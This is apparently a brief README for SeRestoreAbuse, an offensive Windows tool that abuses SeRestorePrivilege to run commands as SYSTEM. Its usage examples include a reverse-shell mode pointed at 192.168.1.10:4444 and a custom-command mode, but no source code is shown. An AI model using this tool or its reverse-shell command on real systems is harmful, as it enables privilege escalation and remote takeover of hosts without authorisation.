# SeRestoreAbuse with Reverse shell

Executes a command as SYSTEM when SeRestorePrivilege is assigned. In case it's disabled, the program will enable it for you.

Usage: SeRestoreAbuse.exe "cmd /c ..."

```powershell
Usage:
  SeRestoreAbuse.exe <custom_payload>
  SeRestoreAbuse.exe -revshell <IP:PORT>

Examples:
  SeRestoreAbuse.exe "cmd /c whoami > C:\test.txt"
  SeRestoreAbuse.exe -revshell 192.168.1.10:4444
 ```
